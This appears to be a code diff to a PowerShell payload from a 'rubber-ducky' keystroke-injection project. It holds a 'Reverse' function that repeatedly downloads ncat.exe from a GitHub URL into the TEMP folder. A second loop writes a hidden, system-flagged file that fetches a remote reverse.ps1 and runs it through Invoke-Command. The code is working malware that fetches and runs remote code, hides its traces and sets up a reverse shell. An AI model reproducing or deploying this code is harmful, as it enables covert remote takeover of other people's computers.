@@ -1,10 +1,9 @@
 $functions = {
 	function script:Reverse
 	{
-		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		
 		while($true)
 		{
+			[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 			New-Item -ItemType Directory -Force -Path "$env:TEMP\ncat"
 			((New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/ncat/ncat.exe", "$env:TEMP\ncat\ncat.exe"))
 
@@ -22,13 +21,14 @@ $functions = {
 	{
 		while($true)
 		{
-			$modulename = "34F3E433-9DE0-4930-AF3F-D099EF30490B.ps1"
+			$modulename = "18CAD998-388C-4E2A-83B7-C8F009416642"
 			$modulenamepath = "$env:TEMP\$modulename"
 			
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
+				[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/reverse.ps1"))' -Force $env:TEMP\$modulename
-				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath))" -Append -NoClobber $env:TEMP\$modulename
+				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath))" -Append -NoClobber $env:TEMP\$modulename
 				$modulenamefile = Get-Item $env:TEMP\$modulename
 				$modulenamefile.Attributes = "Hidden","System"
 			}
